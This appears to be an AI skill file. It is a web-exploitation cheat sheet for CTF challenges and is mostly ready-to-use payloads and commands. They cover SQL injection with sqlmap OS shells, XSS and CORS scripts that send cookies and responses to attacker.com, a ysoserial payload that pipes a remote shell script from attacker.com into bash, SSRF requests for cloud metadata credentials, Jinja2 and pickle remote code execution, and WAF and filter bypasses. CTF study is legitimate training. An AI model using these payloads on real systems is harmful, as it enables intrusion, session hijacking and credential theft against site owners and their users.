---
name: ctf-web
description: "CTF web exploitation skill. When user mentions web CTF challenges, web exploitation, SQL injection, XSS, SSRF, deserialization, SSTI, race conditions, JWT attacks, CORS misconfiguration, HTTP request smuggling, or web application security testing in a CTF context. Covers all major web exploitation categories with step-by-step methodology, payloads, and tool usage."
---

# CTF Web Exploitation — Challenge Solving Brain

When solving web CTF challenges:
1. **Enumerate first** — map the attack surface before exploiting
2. **Check the source** — view page source, JavaScript, comments
3. **Intercept everything** — use Burp Suite or browser dev tools
4. **Test systematically** — follow the testing checklist
5. **Chain findings** — low-severity bugs combine into exploits

---

## Phase 1: Reconnaissance

### Initial Survey
```
CHECKLIST:
□ View page source (Ctrl+U)
□ Check robots.txt, sitemap.xml
□ Check /.well-known/, /security.txt
□ Inspect JavaScript files (look for API keys, endpoints)
□ Check HTTP response headers (X-Powered-By, Server)
□ Test for directory listing
□ Check for common backup files (.bak, .old, ~, .swp)
□ Enumerate subdomains if applicable
```

### Hidden Information Discovery
```bash
# Directory enumeration
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt
ffuf -u http://target.com/FUZZ -w /usr/share/wordlists/dirb/common.txt

# Parameter discovery
arjun -u http://target.com/page
paramspider -d target.com

# JavaScript analysis
linkfinder -i http://target.com -o cli
secretfinder -i http://target.com/app.js -e
```

### Cookie and Session Analysis
```
INSPECT:
□ Session cookie values (base64, JWT, serialized objects)
□ Cookie encoding (hex, base64, URL encoding)
□ Session fixation possibilities
□ Cookie scope (path, domain, Secure, HttpOnly, SameSite)
□ Local storage and session storage
```

---

## Phase 2: SQL Injection

### Detection Payloads
```sql
' OR 1=1--
' OR '1'='1
" OR 1=1--
' OR ''='
1' OR 1=1#
1' OR 1=1/*
' UNION SELECT NULL--
') OR 1=1--
```

### Union-Based Extraction
```sql
-- Step 1: Find column count
' ORDER BY 1-- 
' ORDER BY 2-- 
' ORDER BY 3-- 
-- Continue until error

-- Step 2: Find column types
' UNION SELECT NULL,NULL,NULL-- 
' UNION SELECT 'a',NULL,NULL-- 
' UNION SELECT NULL,'a',NULL-- 

-- Step 3: Extract data
' UNION SELECT username,password,NULL FROM users-- 
' UNION SELECT table_name,NULL,NULL FROM information_schema.tables-- 
' UNION SELECT column_name,NULL,NULL FROM information_schema.columns WHERE table_name='users'-- 
```

### Blind SQL Injection
```sql
-- Boolean-based
' AND 1=1--    (true condition)
' AND 1=2--    (false condition)
' AND (SELECT LENGTH(username) FROM users WHERE username='admin')>5--

-- Character-by-character extraction
' AND (SELECT SUBSTRING(username,1,1) FROM users WHERE id=1)='a'--
' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>64--

-- Time-based
' AND SLEEP(5)--
' AND IF(1=1,SLEEP(5),0)--
' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)--
```

### SQLMap Automation
```bash
# Basic detection
sqlmap -u "http://target.com/page?id=1" --batch

# With POST data
sqlmap -u "http://target.com/login" --data="user=admin&pass=test" --batch

# Enumerate databases
sqlmap -u "http://target.com/page?id=1" --dbs --batch

# Dump specific table
sqlmap -u "http://target.com/page?id=1" -D mydb -T users --dump --batch

# OS shell
sqlmap -u "http://target.com/page?id=1" --os-shell --batch

# Custom headers/cookies
sqlmap -u "http://target.com/page?id=1" --cookie="session=abc" --headers="X-Auth: token" --batch
```

### WAF Bypass Techniques
```sql
-- Case variation
' UnIoN SeLeCt 1,2,3--

-- Inline comments
/**/UNION/**/SELECT/**/1,2,3--

-- Encoding
' UNION SELECT 1,2,3--    (URL encode: %27%20UNION%20SELECT%201%2C2%2C3--)

-- Alternative syntax
' UNION ALL SELECT 1,2,3-- 
' INTERSECT SELECT 1,2,3-- 

-- Parameter pollution
id=1' UNION SELECT NULL--&id=1
```

---

## Phase 3: Cross-Site Scripting (XSS)

### Reflected XSS Payloads
```html
<script>alert(1)</script>
<script>alert(document.domain)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<marquee onstart=alert(1)>
<details open ontoggle=alert(1)>
<video src=x onerror=alert(1)>
<audio src=x onerror=alert(1)>
<iframe src="javascript:alert(1)">
```

### Stored XSS
```html
<!-- In user profile, comments, forums -->
<script>fetch('http://attacker.com/steal?c='+document.cookie)</script>
<img src=x onerror="fetch('http://attacker.com/steal?c='+document.cookie)">
<svg onload="new Image().src='http://attacker.com/steal?c='+document.cookie">
```

### DOM-Based XSS
```javascript
// Check these sources
document.URL
document.documentURI
document.referrer
window.name
location.hash
location.search
document.cookie

// Check these sinks
document.write()
element.innerHTML
element.outerHTML
eval()
setTimeout()
setInterval()
document.location
window.location
```

### Filter Bypass
```html
<!-- Case bypass -->
<ScRiPt>alert(1)</sCrIpT>

<!-- No parentheses -->
<script>alert`1`</script>

<!-- Without alert -->
<script>confirm(1)</script>
<script>prompt(1)</script>
<script>print()</script>

<!-- Encoding -->
<script>eval(atob('YWxlcnQoMSk='))</script>
<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>

<!-- SVG -->
<svg><script>alert(1)</script></svg>

<!-- Event handlers -->
<details open ontoggle=alert(1)>
<img src=x onerror=alert(1)>
```

### XSS Cheatsheet
```bash
# Reflected XSS testing
dalfox url "http://target.com/search?q=test" --blind yoursrv.xss.ht

# DOM XSS
python3 -c "
import urllib.parse
payload = '<script>alert(1)</script>'
print('URL-encoded:', urllib.parse.quote(payload))
print('Double-encoded:', urllib.parse.quote(urllib.parse.quote(payload)))
"
```

---

## Phase 4: Server-Side Request Forgery (SSRF)

### Detection
```
TEST THESE INPUTS:
□ URL parameters (url, link, src, href, redirect)
□ File upload via URL
□ Webhook/callback URLs
□ PDF/image generation endpoints
□ RSS feed URLs
□ API proxy endpoints
```

### Internal Service Discovery
```
CLOUD METADATA URLS:
AWS:     http://169.254.169.254/latest/meta-data/
GCP:     http://metadata.google.internal/computeMetadata/v1/
Azure:   http://169.254.169.254/metadata/instance?api-version=2021-02-01

INTERNAL SERVICES:
http://localhost:8080
http://127.0.0.1:3000
http://internal-service:8080
http://[::1]:8080

FILE PROTOCOL:
file:///etc/passwd
file:///proc/self/environ
file:///proc/self/cmdline
```

### Bypass Techniques
```
BYPASS 1: IP address encoding
http://0x7f000001/
http://0177.0.0.1/
http://2130706433/
http://0x7f.0x00.0x00.0x01/

BYPASS 2: DNS rebinding
Host DNS that resolves to external first, then internal

BYPASS 3: Redirect follow
Host a server that redirects to http://169.254.169.254/

BYPASS 4: IPv6
http://[0:0:0:0:0:ffff:127.0.0.1]/
http://[::1]/

BYPASS 5: Decimal/Octal
http://0177.0.0.1/     (octal)
http://127.1/           (省略 zero)

BYPASS 6: Case variation
http://LOCALHOST/
http://127.0.0.1/
```

### SSRF Exploitation Chain
```bash
# Step 1: Confirm SSRF
curl "http://target.com/fetch?url=http://httpbin.org/ip"

# Step 2: Internal scan
for port in 80 443 3000 8080 8443; do
    curl -s -o /dev/null -w "%{http_code}" "http://target.com/fetch?url=http://127.0.0.1:$port"
done

# Step 3: Cloud metadata
curl "http://target.com/fetch?url=http://169.254.169.254/latest/meta-data/"
curl "http://target.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
```

---

## Phase 5: Server-Side Template Injection (SSTI)

### Detection
```
TEST PAYLOADS:
{{7*7}}       → Should return 49
${7*7}        → Should return 49
<%= 7*7 %>    → Should return 49
#{7*7}        → Should return 49
<% 7*7 %>     → Should return 49
```

### Engine Identification
```
{{7*7}} = 49    → Twig, Jinja2, Nunjucks
${7*7} = 49     → FreeMarker, Velocity
#{7*7} = 49     → Ruby ERB, Smarty
<%= 7*7 %> = 49 → EJS, Jade/Pug
```

### Jinja2 Exploitation
```python
# Read file
{{ ''.__class__.__mro__[1].__subclasses__() }}
{{ config.items() }}
{{ self.__init__.__globals__['os'].popen('id').read() }}

# RCE via os module
{{ ''.__class__.__mro__[1].__subclasses__()[X].__init__.__globals__['__builtins__']['__import__']('os').popen('cat /etc/passwd').read() }}

# Using lipsum
{{ lipsum.__globals__['os'].popen('id').read() }}
{{ lipsum.__globals__['__builtins__']['__import__']('os').popen('id').read() }}

# Using cycler/joiner/namespace
{{ cycler.__init__.__globals__.os.popen('id').read() }}
{{ joiner.__init__.__globals__.os.popen('id').read() }}
{{ namespace.__init__.__globals__.os.popen('id').read() }}
```

### Twig Exploitation
```php
// RCE
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
{{['ls']|filter('system')}}
```

### Tool
```bash
# SSTI detection and exploitation
python3 -c "
import requests
payloads = ['{{7*7}}', '${7*7}', '<%= 7*7 %>', '#{7*7}']
for p in payloads:
    r = requests.get('http://target.com/page', params={'input': p})
    if '49' in r.text:
        print(f'Vulnerable to: {p}')
"
```

---

## Phase 6: Deserialization Attacks

### PHP Deserialization
```php
// Object injection
O:4:"User":2:{s:4:"name";s:5:"admin";s:4:"role";s:5:"admin";}

// Phar deserialization (file upload)
php -d phar.readonly=0 -r "
\$p = new Phar('test.phar');
\$p->startBuffering();
\$p->setStub('<?php __HALT_COMPILER();');
\$o = new User();
\$o->name = 'admin';
\$p->addFromString('test.txt', 'test');
\$p->setMetadata(\$o);
\$p->stopBuffering();
echo base64_encode(file_get_contents('test.phar'));
"
```

### Java Deserialization
```bash
# Generate payload with ysoserial
java -jar ysoserial.jar CommonsCollections1 "curl http://attacker.com/shell.sh | bash" | base64

# Detect serialization
echo -n "rO0AB" | base64 -d  # Java serialized objects start with aced0005
strings binary | grep "rO0AB"
```

### Python Deserialization
```python
# pickle RCE
import pickle
import os

class Exploit(object):
    def __reduce__(self):
        return (os.system, ('id',))

payload = pickle.dumps(Exploit())
print(payload.hex())

# base64 encode
import base64
print(base64.b64encode(payload).decode())
```

---

## Phase 7: JWT Attacks

### JWT Structure
```
Header.Payload.Signature
eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.signature

Header: {"alg":"HS256","typ":"JWT"}
Payload: {"user":"admin","iat":1234567890}
```

### Common Attacks
```bash
# 1. None algorithm attack
# Change header: {"alg":"none","typ":"JWT"}
# Remove signature, keep trailing dot

# 2. Weak secret (brute force)
hashcat -m 16500 jwt.txt wordlist.txt
john jwt.txt --wordlist=rockyou.txt --format=HMAC-SHA256

# 3. Key confusion (RS256 → HS256)
# Use public key as HMAC secret
openssl rsa -in pubkey.pem -pubin -outform PEM > pubkey_plain.pem
python3 -c "
import hmac, hashlib, base64, json
header = base64.urlsafe_b64encode(json.dumps({'alg':'HS256','typ':'JWT'}).encode()).rstrip(b'=')
payload = base64.urlsafe_b64encode(json.dumps({'user':'admin'}).encode()).rstrip(b'=')
sig = base64.urlsafe_b64encode(hmac.new(open('pubkey_plain.pem').read().encode(), header+b'.'+payload, hashlib.sha256).digest()).rstrip(b'=')
print(f'{header.decode()}.{payload.decode()}.{sig.decode()}')
"

# 4. JKU/X5U header injection
# Modify jku to point to attacker-controlled key file
```

### JWT Tool
```bash
# jwt_tool
python3 jwt_tool.py JWT_TOKEN -C -d wordlist.txt
python3 jwt_tool.py JWT_TOKEN -X a    # Test all attacks
```

---

## Phase 8: Race Conditions

### Detection
```
TEST FOR RACE CONDITIONS:
□ Coupon redemption
□ Balance transfers
□ Vote submission
□ Account creation
□ File upload
□ Password reset
```

### Exploitation
```bash
# Burp Suite Intruder with pitchfork
# Send N concurrent requests with same resource

# Turbo Intruder
python3 -c "
import requests
import threading

def exploit():
    requests.post('http://target.com/redeem', data={'code': 'COUPON123'})

threads = [threading.Thread(target=exploit) for _ in range(20)]
for t in threads: t.start()
for t in threads: t.join()
"

# curl multi
for i in $(seq 1 20); do
    curl -s -X POST http://target.com/redeem -d "code=COUPON123" &
done
wait
```

---

## Phase 9: CORS Misconfiguration

### Detection
```bash
# Test CORS
curl -H "Origin: http://evil.com" http://target.com/api/data -v
# Check for Access-Control-Allow-Origin: http://evil.com
# Check for Access-Control-Allow-Credentials: true

# Test with null origin
curl -H "Origin: null" http://target.com/api/data -v
```

### Exploitation
```html
<!-- Host on attacker.com -->
<script>
var xhr = new XMLHttpRequest();
xhr.open("GET", "http://target.com/api/user", true);
xhr.withCredentials = true;
xhr.onreadystatechange = function() {
    if (xhr.readyState == 4) {
        fetch("http://attacker.com/log?data=" + btoa(xhr.responseText));
    }
};
xhr.send();
</script>
```

---

## Phase 10: HTTP Request Smuggling

### CL.TE
```
POST / HTTP/1.1
Host: target.com
Content-Length: 6
Transfer-Encoding: chunked

0

X
```

### TE.CL
```
POST / HTTP/1.1
Host: target.com
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0
```

### Detection
```bash
# Send request with conflicting headers
curl -X POST http://target.com/ \
  -H "Transfer-Encoding: chunked" \
  -H "Content-Length: 6" \
  -d "0\r\n\r\nX"

# Use Burp Suite HTTP Request Smuggler extension
```

---

## Quick Reference: Tool Commands

```bash
# Burp Suite
# Proxy → HTTP history, Repeater, Intruder

# sqlmap
sqlmap -u URL --batch --dbs
sqlmap -u URL --batch -D db --tables
sqlmap -u URL --batch -D db -T table --dump

# dalfox (XSS)
dalfox url "URL?q=test" --blind callback

# ffuf (directory/parameter fuzzing)
ffuf -u URL/FUZZ -w wordlist.txt
ffuf -u URL -w params.txt -FUZZ

# wfuzz
wfuzz -c -z file,wordlist.txt URL/FUZZ
```

---

**Remember:** Web challenges are about understanding the full request/response cycle. Intercept, modify, replay. Every parameter is a potential injection point. Every response is a clue.
